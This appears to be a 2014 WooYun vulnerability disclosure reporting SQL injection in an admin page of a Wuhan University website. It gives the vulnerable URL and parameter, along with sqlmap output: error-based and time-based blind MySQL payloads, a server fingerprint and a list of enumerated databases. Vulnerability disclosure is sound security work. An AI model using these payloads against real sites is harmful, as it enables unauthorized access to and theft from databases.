wybug_detail: 漏洞详情 披露状态：   									2014-06-07：	细节已通知厂商并且等待厂商处理中									2014-06-09：	厂商已经确认，细节仅向厂商公开									2014-06-19：	细节向核心白帽子及相关领域专家公开									2014-06-29：	细节向普通白帽子公开									2014-07-09：	细节向实习白帽子公开									2014-07-23：	细节向公众公开  简要描述： 武汉大学注入漏洞 详细说明：  http://ygxy.rsgis.whu.edu.cn/admin/column_menu_del.php?id=   漏洞证明：  Place: GETParameter: id    Type: error-based    Title: MySQL >= 5.0 OR error-based - WHERE or HAVING clause    Payload: id=-6847 OR (SELECT 9784 FROM(SELECT COUNT(*),CONCAT(0x7173786f71,(SELECT (CASE WHEN (9784=9784) THEN 1 ELSE 0 END)),0x7161747371,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 OR time-based blind    Payload: id=-4226 OR 4715=SLEEP(5)---web server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, PHP 5.2.17back-end DBMS: MySQL 5.0sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: id    Type: error-based    Title: MySQL >= 5.0 OR error-based - WHERE or HAVING clause    Payload: id=-6847 OR (SELECT 9784 FROM(SELECT COUNT(*),CONCAT(0x7173786f71,(SELECT (CASE WHEN (9784=9784) THEN 1 ELSE 0 END)),0x7161747371,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 OR time-based blind    Payload: id=-4226 OR 4715=SLEEP(5)---web server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, PHP 5.2.17back-end DBMS: MySQL 5.0available databases [5]:[*] information_schema[*] mrbs[*] mysql[*] performance_schema[*] ygxxgc   修复方案：  参数过滤   版权声明：转载请注明来源 Hotler0o@乌云
